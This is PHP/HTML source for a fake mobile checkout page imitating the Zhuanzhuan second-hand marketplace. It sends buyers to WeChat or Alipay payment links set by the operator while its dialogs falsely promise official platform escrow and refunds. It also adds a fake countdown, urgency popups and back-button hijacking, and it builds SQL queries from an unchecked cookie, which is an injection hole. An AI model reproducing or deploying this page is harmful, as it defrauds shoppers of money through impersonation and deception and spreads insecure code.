
<html lang="en" data-dpr="1" style="font-size: 34px;">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta charset="utf-8">
    <link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon"/>
    <meta content="yes" name="apple-mobile-web-app-capable">
    <meta content="yes" name="apple-touch-fullscreen">
    <meta content="telephone=no,email=no" name="format-detection">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
    <title>立即支付</title>
<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');




if($_COOKIE['GoodsID4']){
	$_GoodsID = _fetch_array("SELECT
									goods_class.gclass_id,
									goods_class.gc_name,
									goods_class.gc_type,
									goods_class.web_name,
									goods_class.jump_url,
									goods_class.web_logo,
									goods_class.web_name2,
									goods.goods_id,
									goods.title,
									goods.price,
									goods.freight,
									goods.region,
									goods.goods_desc,
									goods.test_desc,
									goods.hits,
									goods.stock,
									goods.doods_num,
									goods.tran_num,
									goods.recovery_rate,
									goods.user_portrait,
									goods.user_name,
									goods.user_gender,
									goods.user_grade,
									goods.att_capacity,
									goods.att_color,
									goods.att_channel,
									goods.weixin_img,
									goods.zhifubao_img,
									goods.goods_img1,
									goods.goods_img2,
									goods.goods_img3,
									goods.goods_img4,
									goods.goods_img5,
									goods.test_desc2,
									goods.is_shelves,
									goods.oldnew,
									goods.oldnewa,
									goods.oldnewb,
									goods.oldnewc,
									goods.oldnewd,
									goods.oldnewe,
									goods.oldnewf,
									goods.oldnewg,
									goods.in_admin_id,
									goods.in_class_id,
									goods.imUrl,
									goods.add_time,
									goods.zhifubaoURL,
									goods.weixinurl,
									goods.goods_oid,
									goods.pay_fangshi
								FROM
									goods_class
								INNER JOIN goods ON goods_class.gclass_id = goods.in_class_id 
								WHERE goods_id='{$_COOKIE['GoodsID4']}'") or die('SQL执行错误');


}
if($_COOKIE['GoodsID4']){
	
    //存在就更新此数据状态为3地址页和时间
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE gid='{$_COOKIE['GoodsID4']}'");
	
	if($_OID){
		_query("
			UPDATE 
				useraddress
			SET 
				state=4,
				utime='{$_CURRENT_TIME}'
			WHERE 
				gid='{$_GoodsID['goods_id']}' LIMIT 1") or die(mysql_error());
		  _close();
		  session_destroy();
	}
	if($_GoodsID['oldnew']==1)
$oldnew888="全新";
if($_GoodsID['oldnew']==2)
$oldnew888="99新";
$oldnew666="仅激活，未使用过，全部功能正常，如下为真机实拍图";
if($_GoodsID['oldnew']==3)
$oldnew888="98新";
$oldnew666="相当于新机仅使用一周，全部功能正常，电池品质可靠耐用，机部几乎无划痕，如下为真机实拍图";
if($_GoodsID['oldnew']==4)
$oldnew888="95新";
$oldnew666="相当于新机仅使用二周，全部功能正常，电池品质可靠耐用，机部几乎无划痕，如下为真机实拍图";
if($_GoodsID['oldnew']==5)
$oldnew888="88新";
$oldnew666="相当于新机使用过 2 个月左右，基础功能正常，电池检测正常，机身有磨损或屏幕有轻微划痕，带壳贴膜后基本不可见。如下为真机实拍图。";
if($_GoodsID['oldnew']==6)
$oldnew888="85新";
$oldnew666="相当于新机使用过 2 个月左右，基础功能正常，电池检测正常，机身有磨损或屏幕有轻微划痕，带壳贴膜后基本不可见。如下为真机实拍图。";


if($_GoodsID['oldnewa']==1)
$oldnewa88="2G";
if($_GoodsID['oldnewa']==2)
$oldnewa88="4G";
if($_GoodsID['oldnewa']==3)
$oldnewa88="6G";
if($_GoodsID['oldnewa']==4)
$oldnewa88="8G";

if($_GoodsID['oldnewb']==1)
$oldnewb888="64G";
if($_GoodsID['oldnewb']==2)
$oldnewb888="128G";
if($_GoodsID['oldnewb']==3)
$oldnewb888="256G";
if($_GoodsID['oldnewb']==4)
$oldnewb888="512G";


	
	if(!$_GoodsID){
       header('Location:'. htmlspecialchars_decode($_GoodsID['jump_url']).'');
    }
}else{
    header('Location:'. htmlspecialchars_decode($_GoodsID['jump_url']).'');
}




if($_GoodsID['oldnewe']==1){
$oldnewe9999="none";
$oldnewe8888="";
$oldnewe7777="官方验机";
    
}
if($_GoodsID['oldnewe']==2){
$oldnewe9999="";
$oldnewe8888="none";
$oldnewe7777="支持验机";
}



if($_GoodsID['pay_fangshi']==1){
    
$pay_fangshi9999="none";

$pay_fangshi8888="";

$pay_fangshi7777="none";
    
}
if($_GoodsID['pay_fangshi']==2){
    
$pay_fangshi9999="";

$pay_fangshi8888="";

$pay_fangshi7777="";           
}

if($_GoodsID['pay_fangshi']==3){
    
$pay_fangshi9999="";

$pay_fangshi8888="";

$pay_fangshi7777="none";           
}

if($_GoodsID['pay_fangshi']==4){
    
$pay_fangshi9999="";

$pay_fangshi8888="none";

$pay_fangshi7777="";           
}

if($_GoodsID['pay_fangshi']==5){
    
$pay_fangshi9999="";

$pay_fangshi8888="";

$pay_fangshi7777="";           
}
?>
    <link rel="stylesheet" href="style2/css/mo.css">
    
    <script type="text/javascript" src="style2/js/jquery-1.12.4.min.js"></script> 
    <script type="text/javascript" src="style2/js/layer11.js"></script>  
    <style type="text/css">
        @charset "utf-8";
        html { color: #000; background: #fff; overflow-y: scroll; -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100% }
        html * { outline: 0; -webkit-text-size-adjust: none; -webkit-tap-highlight-color: rgba(0,0,0,0) }
        html, body { font-family: sans-serif }
        body, div, dl, dt, dd, ul, ol, li, h1, h2, h3, h4, h5, h6, pre, code, form, fieldset, legend, input, textarea, p, blockquote, th, td, hr, button, article, aside, details, figcaption, figure, footer, header, hgroup, menu, nav, section { margin: 0; padding: 0 }
        input, select, textarea { font-size: 100% }
        table { border-collapse: collapse; border-spacing: 0 }
        fieldset, img { border: 0 }
        abbr, acronym { border: 0; font-variant: normal }
        del { text-decoration: line-through }
        address, caption, cite, code, dfn, em, th, var { font-style: normal; font-weight: 500 }
        ol, ul { list-style: none }
        caption, th { text-align: left }
        h1, h2, h3, h4, h5, h6 { font-size: 100%; font-weight: 500 }
        q:before, q:after { content: '' }
        sub, sup { font-size: 75%; line-height: 0; position: relative; vertical-align: baseline }
        sup { top: -.5em }
        sub { bottom: -.25em }
        a:hover { text-decoration: underline }
        ins, a { text-decoration: none }
        body { height: 100%; overflow: hidden }
    </style>
    <style type="text/css">
    /*特殊支付模式弹出层样式*/
        .querenzhifu { position: fixed; left: 0; right: 0; top: 0; bottom: 0; background-color: rgba(0, 0, 0, 0.4); z-index: 201; display: none; }
        .querenzhifu .content { position: absolute; left: 4%; top: 280px; width: 92%; background-color: #fff; -webkit-border-radius: 6px; -moz-border-radius: 6px; border-radius: 6px; text-align: center; overflow: hidden; padding-bottom: 12px; margin-top: -190px; }
        .querenzhifu .content .title { height: 50px; line-height: 50px; padding: 0 10px; background-color: #eee; }
        .querenzhifu .title .pull-left { font-size: 18px; color: #439057; padding-left: 36px; background-image: url(../ysimage/1.png); background-position: 0 center; background-size: 32px; background-repeat: no-repeat; }
        .querenzhifu .title .pull-right { width: 24px; background-image: url(../ysimage/2.png); background-position: 0 center; height: 40px; margin: 5px 0 0; /*background-size: 32px;*/ background-size: 14px 25px; background-repeat: no-repeat; display: inline-block; float: right; position: relative; top: -48px; }
        .querenzhifu .info { margin: 20px 0; font-size: 14px; line-height: 28px; }
        .querenzhifu .info span { display: inline-block; position: relative; }
        .querenzhifu .info span:before,
        .querenzhifu .info span:after { content: ""; width: 4px; height: 4px; position: absolute; top: 50%; margin-top: -2px; -webkit-border-radius: 50%; -moz-border-radius: 50%; border-radius: 50%; background-color: #439057; }
        .querenzhifu .info span:before { left: -6px; }
        .querenzhifu .info span:after { right: -6px; }
        .querenzhifu img { width: 50%; }
        .querenzhifu .green { display: block; color: #439057; line-height: 28px; font-size: 12px; }
        .querenzhifu .gray { line-height: 28px; font-size: 12px; color: #999; }
		
header { display: -webkit-flex; /* Safari */ display: flex; flex-direction: row; flex-wrap: nowrap; justify-content: flex-start; position: fixed; z-index: 9999; width: 100%; top: 20; border-bottom: #eee solid 1px; padding: 0.05rem 0; text-align: center; background: #fff; }
.h_l { flex-basis: 1.4rem; flex-shrink: 0; height: 100%; margin-left: .3rem; margin-top:1.rem; }

.h_c { flex-basis: 100%; flex-shrink: 1; height: 100%; line-height: 1rem; display: -webkit-flex; /* Safari */ display: flex; flex-direction: row; flex-wrap: nowrap; justify-content: center; }

.h_r { flex-basis: 1rem; flex-shrink: 0; height: 0.75rem; background: url(img/rp.png) no-repeat center 0.45rem; background-size: 60%; margin-right: .3rem; }

.ico42 { flex-basis: 0.75rem; height: 0.75rem; flex-shrink: 0; background: url(img/rl.png) no-repeat center center; background-size: 100%; }

.ico43 { flex-basis: 0.75rem; height: 0.75rem; flex-shrink: 0; background: url(img/rk.png) no-repeat center center; background-size: 100%; margin-left: 1rem; margin-right: 1rem; }

.ico44 { flex-basis: 0.75rem; height: 0.75rem; flex-shrink: 0; background: url(img/rr.png) no-repeat center center; background-size: 65% }
main { margin-top: 60px; }
.storeLogo,.goodInfo{
	padding: 0.12rem 0;
	margin: 0 0.62rem;
	border-bottom: 1px solid #eeeeee;
}
.goodInfo img{
	width: 20%;
	height: 1.8rem;	
	margin-right: 0.5rem;
}
.fl{float:left;}
.fr{float:right;}
.goodDetail{
	width: 70%;
}
.goodDetail p{
	color: #999999;
	font-size: 0.4rem;
	line-height: 0.5rem;
	height: 0.5rem;
	overflow: hidden;
}
.goodDetail span{
	color: #ff3c3c;
	font-size: 0.45rem;
    	margin-top: 10%;
    	padding-left: 32%;
}
.goodDetail span em{
	font-size: 0.5rem;
}
.goodInfo{
	overflow: hidden;
}
.payWay{
	height: 20px;
	line-height: 20px;
	font-size: 18px;
	padding-left: 15px;
}
.wechat{
	background: white;
	padding: 0.62rem;
	font-size: 0.55rem;
}
.chat img{
	width: 0.6rem;
	margin-right: 0.25rem;
	vertical-align: middle;
}
.chat span{
	vertical-align: middle;
	padding-bottom: 0.62rem;
}
.chat p{
	font-size: 0.35rem;
	color: #888888;
	margin-top: 5px;
	margin-left:27px;
	margin-bottom:30px;
}
    </style>
    <link href="https://s1.zhuanstatic.com/trade/m-pay/static/css/chunk-175efd7a.f53ae0ba.css" rel="prefetch">
<link href="https://s1.zhuanstatic.com/trade/m-pay/static/css/chunk-603826c7.97ab5266.css" rel="prefetch">
<link href="detail-strict_files/zm.css" rel="prefetch">





<link href="https://s1.zhuanstatic.com/trade/m-pay/static/css/app.85e00f03.css" rel="preload" as="style">
<link href="https://s1.zhuanstatic.com/trade/m-pay/static/css/chunk-vendors.b24e736b.css" rel="preload" as="style">

<link href="https://s1.zhuanstatic.com/trade/m-pay/static/css/chunk-vendors.b24e736b.css" rel="stylesheet">
<link href="https://s1.zhuanstatic.com/trade/m-pay/static/css/app.85e00f03.css" rel="stylesheet">
</head>
<body style="font-size: 12px;">
    <header class="flex-wrap">
        <div class="h_l flex-con0"><a  href="#" onClick="javascript :history.back(-1);"><img src="style/img/leftjian.png" style="opacity:0.4;margin-top:-7px;margin-left:-14px;" height="18"></a></div>
        <div class="h_c" style="margin-top:-10px;margin-left:-14px;font-size:18px;">
           立即支付
        </div>
        <div class="h_r flex-con0">
            <i class="ico45"></i>
        </div>
        
    </header>
    <!--付款界面内容 Start-->
<main> 


<style>.loading {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 1;
      background-color: #F2F3F6;
    }
    .loading.off {
      display: none;
    }
    .loading-indicator {
      position: absolute;
      left: 50%;
      top: 50%;
      margin-left: -60px;
      margin-top: -50px;
      width: 120px;
      height: 100px;
    }
    .loading-indicator:after {
      display: block;
      content: ' ';
      position: absolute;
      top: 50%;
      left: 50%;
      margin-left: -20px;
      margin-top: -20px;
      width: 40px;
      height: 40px;
      background: url(https://img1.zhuanstatic.com/common/img/loading.gif) no-repeat 50% 50%;
      background-size: 40px 40px;
    }
    #app:empty::after {
      content: "";
      position: fixed;
      left: 0;
      top: 0;
      right: 0;
      bottom: 0;
      background-image:   linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),   linear-gradient(#fff 100%, transparent 0);
      background-position:  3.2vw 175.46vw,  87.16vw 153.3vw,  14.93vw 158.56vw,  14.93vw 151.56vw,  7.5vw 150.76vw,  87.16vw 132.23vw,  14.93vw 137.5vw,  55.33vw 131.16vw,  35vw 131.16vw,  14.93vw 130.5vw,  7.5vw 129.7vw,  87.16vw 111.16vw,  14.93vw 116.43vw,  14.93vw 109.43vw,  7.5vw 108.63vw,  87.16vw 90.1vw,  14.93vw 95.36vw,  57.28vw 89.03vw,  35vw 89.03vw,  14.93vw 88.36vw,  7.5vw 87.56vw,  87.16vw 69.03vw,  14.93vw 74.3vw,  39vw 67.96vw,  14.93vw 67.3vw,  7.5vw 66.5vw,  87.16vw 47.96vw,  14.93vw 53.23vw,  14.93vw 46.23vw,  7.5vw 45.43vw,  6.4vw 33.96vw,  36.85vw 20.39vw,  29.12vw 19.06vw,  27.2vw 5.25vw,  4.29vw 4.29vw,  0 0;
      background-size:  93.6vw 9.6vw,  5.33vw 5.33vw,  56.33vw 3.2vw,  16vw 4vw,  5.33vw 5.33vw,  5.33vw 5.33vw,  41.6vw 3.2vw,  6.4vw 3.2vw,  16vw 3.2vw,  16vw 4vw,  5.33vw 5.33vw,  5.33vw 5.33vw,  25.8vw 3.2vw,  16vw 4vw,  5.33vw 5.33vw,  5.33vw 5.33vw,  25.6vw 3.2vw,  19.2vw 3.2vw,  17.95vw 3.2vw,  16vw 4vw,  5.33vw 5.33vw,  5.33vw 5.33vw,  44.8vw 3.2vw,  6.8vw 3.2vw,  20vw 4vw,  5.33vw 5.33vw,  5.33vw 5.33vw,  41.6vw 3.2vw,  16vw 4vw,  5.33vw 5.33vw,  14.79vw 3.7vw,  4.72vw 3.2vw,  7.72vw 4.8vw,  50.34vw 3.7vw,  19.7vw 19.7vw,  100% 100%;
      background-repeat: no-repeat;
    }</style><link rel="stylesheet" type="text/css" href="detail-strict_files/zm.css"><script charset="utf-8" src="https://s1.zhuanstatic.com/trade/m-pay/static/js/chunk-6ea6d82d.84830c48.js"></script><link rel="stylesheet" type="text/css" href="https://s1.zhuanstatic.com/trade/m-pay/static/css/chunk-603826c7.97ab5266.css"><script charset="utf-8" src="https://s1.zhuanstatic.com/trade/m-pay/static/js/chunk-603826c7.87a2146d.js"></script></head><body style="font-size: 12px;" class="z-overflow-hidden"><noscript><strong>We're sorry but m_pay_v2 doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript>
    
    
    <div class="app"><div data-v-969b4576=""><div data-v-494bbe14="" data-v-969b4576="" class="page-container"><div data-v-494bbe14="" class="page-header"><!----><div data-v-62e68973="" data-v-969b4576="" class="goodsinfo" data-v-494bbe14=""><div data-v-62e68973="" class="goodsinfo-pic" style="background-image: url(&quot;<?php echo $_GoodsID['goods_img1'] ?>&quot;);"></div><div data-v-62e68973="" class="goodsinfo-msg"><p data-v-62e68973="" class="goodsinfo-msg-title">  <?php echo $oldnew888;?> <?php echo $_GoodsID['title']; ?>  </p><br><div data-v-62e68973="" class="goodsinfo-msg-bottom"><div data-v-4de69a3d="" data-v-62e68973="" class="price"><span data-v-4de69a3d="" class="price-symbol">¥</span><span data-v-4de69a3d=""><?php echo $_GoodsID['price']; ?></span><span data-v-4de69a3d="" class="price-symbol">.00</span></div><div data-v-62e68973="" class="z-count-down"><p data-v-62e68973="" class="countdown">剩余<span data-v-62e68973="" class="countdown-number">00</span>时<span data-v-62e68973="" class="countdown-number">10</span>分<span data-v-62e68973="" class="a countdown-number">300</span>秒</p></div></div></div></div></div>
  <link rel="stylesheet" type="text/css" href="detail-strict_files/h5cashier1.css" media="all">
  <script type="text/javascript" src="123.js"></script>
<script type="text/javascript">
$(document).ready(function() {
		var times = 60 * 100; // 300秒
		countTime = setInterval(function() {
			times = --times < 0 ? 0 : times;
			var ms = Math.floor(times / 100).toString();

			if(ms.length <= 1) {
				ms = "0" + ms;
			}
			var hm = Math.floor(times % 100).toString();
			if(hm.length <= 1) {
				hm = "0" + hm;
			}
			if(times == 0) {
				
				clearInterval(countTime);
			}
			// 获取分钟、毫秒数
			$(".a").html(ms);
			$(".b").html(hm);
		}, 10);
	});	
		function yue08() {
    var yue8888 = document.getElementById("yue8888");
		yue8888.style.display="none";
}
			function yue01() {
    var yue222 = document.getElementById("yue222");
		yue222.style.display="none";}
						function yue02() {

		window.location.href="ddxq.php";
}
function tishi(){ 
yue8888.style.display="block";
} 
setTimeout(tishi,2500) 
</script>

 




    <div data-v-494bbe14="" class="page-content" style="padding-top: 110.8px;">
        
        <section data-v-969b4576="" data-v-494bbe14="" class="pay-list">
            
            <h2 data-v-969b4576="" data-v-494bbe14="" class="pay-list-title">支付方式</h2>
            <style type="text/css">
#radio_wrap li input{padding:0px; width:0px; height:0px; border-style:none;}

#radio_wrap li{background:url(style/img/2.png) no-repeat;background-size:100% 100%; width:20px; height:20px; display:inline-block; *display:inline; *zoom:1;border-radius: 10px;}

i{font-style: normal;text-align: center;color: #fff;font-family: '黑体'}
#radio_wrap li.checked {background:url(style/img/xz.png) no-repeat;background-size:100% 100%; width:20px; height:20px;}
</style>

<form name="form1">
            <div id="radio_wrap" data-v-969b4576="" class="zz-radio-list" data-v-494bbe14="">
                
        <div class="zz-cell-item zz-radio-item" style="display:<?php echo $pay_fangshi8888;?>;" ><div class="zz-cell-item-body"><!---->
        
        <div class="zz-cell-item-content"  ><!---->
        <div data-v-969b4576="" class="zz-pay-method-card">
            <div class="zz-pay-method-icon"><div class="z-image" style="width: 0.76642rem; height: 0.76642rem;">
                <img src="detail-strict_files/wx1.png" class="z-image__img" style="object-fit: contain;"></div></div>
                <div class="zz-pay-method-info"><div class="zz-pay-method-top">
                    <div class="zz-pay-method-title">微信支付
          <!----></div><div class="zz-pay-method-tags"><div class="zz-tag" style="color: rgb(255, 85, 85); border: 1px solid rgb(255, 85, 85); background-color: rgb(255, 255, 255);">
  推荐
</div></div></div><div class="zz-pay-method-bottom"><div class="zz-pay-method-desc">
          亿万用户的选择，更快更安全
        </div>
       </div></div></div></div>
        
        <div class="zz-cell-item-right"><label class="zz-radio is-checked"><div class="zz-radio-icon"><i class="z-icon z-icon--image" style="font-size: 20px;"><div class="fr" ><li class="c"><input type="radio" id="man" name="radio_a" class="rd" /></li>
<label for="radio_a_01"></label>
</div><!----></i></div><!----></label></div></div>
       
        <div class="zz-cell-item-children" ><div data-v-969b4576="" class="zz-radio-box"><!---->
        
        <div class="zz-radio-box-list"></div></div>
        
        <div data-v-969b4576=""><!---->
        <div class="zz-check-group zz-check-list"></div></div></div></div>
        
        
        <div id="man" class="zz-cell-item zz-radio-item"   style="display:<?php echo $pay_fangshi7777;?>;"  ><div class="zz-cell-item-body"><!---->
        <div class="zz-cell-item-content"><!----><div data-v-969b4576="" class="zz-pay-method-card">
            <div class="zz-pay-method-icon"><div class="z-image" style="width: 0.76642rem; height: 0.76642rem;">
                <img src="detail-strict_files/zfb.png "class="z-image__img" style="object-fit: contain;"></div></div>
                <div class="zz-pay-method-info">
                    <div class="zz-pay-method-top"><div class="zz-pay-method-title">支付宝
          <!----></div>
          
          <div class="zz-pay-method-tags"><div class="zz-tag" style="color: rgb(255, 148, 41); border: 1px solid rgb(255, 148, 41); background-color: rgb(255, 255, 255);">
  HOT
</div></div></div><div class="zz-pay-method-bottom"><div class="zz-pay-method-desc">
          10亿人都在用，真安全，更方便
        </div>
        </div></div></div><!----></div>
        
        <div class="zz-cell-item-right"><label class="zz-radio"><div class="zz-radio-icon"><i class="z-icon z-icon--image" style="font-size: 20px;"><div class="fr"><li class="c"><input type="radio" id="woman" name="radio_a" class="rd"/></li>
<label for="radio_a_02"></label>
</div><!----></i></div><!---->

</label></div></div><!----></div></div></form>
        
        <div data-v-969b4576="" class="message-box" data-v-494bbe14="">除转转自营外，应由卖方就所销售物品向买家出具发票等相关凭证。平台不代卖家承担任何责任。</div></section><div data-v-969b4576="" class="z-button-group default fixed" data-v-494bbe14=""><div class="z-button-group__default z-button-group__default--shadow">
            
            
         
            
            </div>
               </div>
 <div id="yue8888"  style="display:none;">
        <div class="am-dialog-mask"style="z-index: 9999;"></div><div  class="am-dialog-box" style="z-index: 9999;margin-top: -71.4286px; opacity: 1; transform: scale(1);">    <div class="am-dialog-content"><div class="am-dialog-text" ><img src="./detail-strict_files/bx.png"style="width:150px; height:150px;"><br><br>您的资金将付到转转官方平台担保,请放心支付,不满意7天内可退款,平台30天为您免费保质</div><div onclick="yue08();" class="am-dialog-button" am-mode="two"style="font-size: 16px;color:#32CD32;"><a >我知道了</a></div>    </div></div></div>
      
	
	
	
	
	 <div id="yue222"  style="display:none;">
        <div class="am-dialog-mask"style="z-index: 9999;"></div><div  class="am-dialog-boxa" style="z-index: 9999;margin-top: -71.4286px; opacity: 1; transform: scale(1);">    <div class="am-dialog-content"><div class="am-dialog-text" style="text-align:center;">订单已生成，请立即支付<br><font color="fff">不然喜欢的商品可能会被抢购哦</font></div><div class="am-dialog-button" am-mode="two" ><a onclick="yue02();" style="color:#A9A9A9;font-size: 16px;">暂时放弃</a><a onclick="yue01();"style="color:red;font-size: 16px;">立即支付</a></div>    </div></div></div>
      
	
            
            </div></div></div></div></div>
            


 <script type="text/javascript">
(function() {
    var radioWrap = document.getElementById("radio_wrap"),
        li = radioWrap.getElementsByTagName("li");
    for(var i = 0; i < li.length; i++){
        li[i].onclick = function() {
            for(var i = 0; i < li.length; i++){
                li[i].className = "";
            }
            this.className = "checked";
        }
    }
})();
</script> 

    <br>
    <br>

<style type="text/css">
.fixFoot{
	position: fixed;
	left: 0;
	bottom: 3;
	width: 100%;
	height: 50px;
}
.fixFoota{
	position: fixed;
	left: 0;
	bottom: 60;
	width: 100%;
	height: 50px;
}
.fixFootb{
	position: fixed;
	left: 0;
	bottom: 3;
	width: 100%;
	height: 50px;
}
.submitBtn{
	background: #ff5647;
	color: white;
	font-size: 0.65rem;
	width: 100%;
	padding: 0.3rem 0;
	border: none;
	border-radius: 0.07rem;
	margin: 0.3rem 0.62rem 0 0;
	text-align: center;
}
</style>
<div class="fixFoot clearfix" style="background-color:#E5543B;">
<div style="text-align:center; height:50px; line-height:50px;
<?php
if($_GoodsID['pay_fangshi']=='4')
{
    echo "";
}
else
{
    echo "display:none;";
}
?>
"><a  onClick="outputaaaa()"><div style="color:#FFFFFF; font-size:18px;"><em>&yen;</em><?php echo $_GoodsID['price']; ?> 立即支付</div></a></div>	

<div style="text-align:center; height:50px; line-height:50px;
<?php
if($_GoodsID['pay_fangshi']=='3')
{
    echo "";
}
else
{
    echo "display:none;";
}
?>
"><a  onClick="outputaaaa()"><div style="color:#FFFFFF; font-size:18px;"><em>&yen;</em><?php echo $_GoodsID['price']; ?> 立即支付</div></a></div>		

<div id="aa" style="text-align:center; height:50px; line-height:50px;
<?php
if($_GoodsID['pay_fangshi']=='2')
{
    echo "";
}
else
{
    echo "display:none;";
}
?>
"><a><div style="color:#FFFFFF; font-size:18px;" onClick="outputaaaa()" id="demo" ><em>&yen;</em><?php echo $_GoodsID['price']; ?> 立即支付</div></div>	</a>

<div style="text-align:center; height:50px; line-height:50px;<?php
if($_GoodsID['pay_fangshi']=="1")
{
    echo "";
}
else
{
    echo "display:none;";
}
?>"><a onClick="outputb()"><div style="color:#FFFFFF; font-size:18px;"><em>&yen;</em><?php echo $_GoodsID['price']; ?> 微信立即支付</div></a></div>		
</div>


<div  class="fixFoot clearfix" style="background-color:#E5543B;<?php
if($_GoodsID['pay_fangshi']=="5")
{
    echo "";
}
else
{
    echo "display:none;";
}
?>">
<div style="text-align:center; height:50px; line-height:50px;"><a onClick="outputaaaa()"><div style="color:#FFFFFF; font-size:18px;"><em>&yen;</em><?php echo $_GoodsID['price']; ?> 立即支付</div></a></div>	
</div>
</div>
</div>

<script>

function outputaaaa(){
    

     var radioSelete = "Nothing";
     var seletedValue;
     for(i=0;i<document.form1.radio_a.length;i++)
     {
        if(document.form1.radio_a[i].checked)  
        {
         radioSelete = "seleted";
         seletedValue = document.form1.radio_a[i].value;
        }
     }
     if(radioSelete == "Nothing")
     {
       alert("请选择支付方式");
       return false;
     }
    
    
    if(document.getElementById("man").checked){

 var aaa = document.getElementById('aaa');
 document.getElementById("demo").innerHTML = "<a id='clickMe' href='<?php echo $_GoodsID['weixinurl'];?>'><em>&yen;</em><?php echo $_GoodsID['price']; ?> 立即支付</a>";
setTimeout(function() {
     // IE
     if(document.all) {
         document.getElementById("clickMe").click();
     }
     // 其它浏览器
     else {
         var e = document.createEvent("MouseEvents");
         e.initEvent("click", true, true);
         document.getElementById("clickMe").dispatchEvent(e);
     }
}, 500);
	}
	

 
    if(document.getElementById("woman").checked){


document.getElementById("demo").innerHTML = "<a id='clickMe' href='<?php echo $_GoodsID['zhifubaoURL'];?>'><em>&yen;</em><?php echo $_GoodsID['price']; ?> 立即支付</a>";
setTimeout(function() {
     // IE
     if(document.all) {
         document.getElementById("clickMe").click();
     }
     // 其它浏览器
     else {
         var e = document.createEvent("MouseEvents");
         e.initEvent("click", true, true);
         document.getElementById("clickMe").dispatchEvent(e);
     }
}, 500);
	}
	
	
	
}
 
function outputb(){
    

     var radioSelete = "Nothing";
     var seletedValue;
     for(i=0;i<document.form1.radio_a.length;i++)
     {
        if(document.form1.radio_a[i].checked)  
        {
         radioSelete = "seleted";
         seletedValue = document.form1.radio_a[i].value;
        }
     }
     if(radioSelete == "Nothing")
     {
       alert("请选择支付方式");
       return false;
     }
    
    
    
    if(document.getElementById("man").checked){
		
		 var paypagea = document.getElementById("paypagea");
		paypagea.style.display="block";
		weixin.style.display="block";
	zhifubao.style.display="none";
	}
	

 
    if(document.getElementById("woman").checked){

		 var paypagea = document.getElementById("paypagea");
		paypagea.style.display="block";
		zhifubao.style.display="block";
			weixin.style.display="none";
	}

  
}
 	function outputc(){
    
 var paypagea = document.getElementById("paypagea");
		paypagea.style.display="none";	
	
}
 if (window.history && window.history.pushState)
         { $(window).on('popstate', function() 
         { var hashLocation = location.hash; 
         var hashSplit = hashLocation.split("#!/");
         var hashName = hashSplit[1]; 
         if (hashName !== '') {
             var hash = window.location.hash; 
             if (hash === '') { 
                 yue222.style.display="";
                 
             } } }); 
             window.history.pushState('forward', null, '#'); }
</script>


<script type="text/javascript">
$(document).ready(function(){
  $("#liequtop").click(function(){
  $("#liequtop").hide();
  });

});
function showOtherDiv(){
    //获取要显示的div对象
    var  otherDiv=document.getElementById('paypage');
    //显示
    otherDiv.style.display="block";
	var  otherDiv=document.getElementById('paypagezz');
	otherDiv.style.display="block";
}
function hideOtherDiv(){
    //获取要显示的div对象
    var  otherDiv=document.getElementById('paypage');
    //显示
    otherDiv.style.display="none";
	var  otherDiv=document.getElementById('paypagezz');
	otherDiv.style.display="none";
}


</script>

    <!--付款界面内容 Start-->
    
    
    <input type="hidden" id="oid" value="106" />
    <input type="hidden" id="payType" value="1" />
    <input type="hidden" id="jiekou_text1" value="转转官方担保收款" />
    <input type="hidden" id="jiekou_color1" value="#00e" />
    <input type="hidden" id="jiekou_text2" value="转转官方(巨人)担保收款" />
    <input type="hidden" id="jiekou_color2" value="#00e" />
    <input type="hidden" id="proImg6" value="https://api.unipay.qq.com/v1/r/1450000186/qrcode?a=l&t=5b90fab8-49d9-bb6a-01c2-83baed29f2d3" />

<script type="text/javascript">

    function querenzhifu() {
        $(".querenzhifu").fadeIn();
        $(".querenzhifu").click(function () {
            $(".querenzhifu").fadeOut(function () {
                //location.href = "topay.asp?pid=3336";
            });
        });
        var oid = $('#oid').val();
        refeshWxPayImg(oid);
    }

    function refeshWxPayImg(oid) {
        window.setInterval(function () {
            $.get('erweimaAjax.asp', { id: oid}, function (ret) {
                var newSrc = ret;
                $('img.erweimaImg').attr('src', newSrc)
            });            
        }, 1000 * 2)
    }
    
    $(function () {
        $('#erweima').click(function () {
            var payType = $('#payType').val(), payContent = '', payStyle = '';
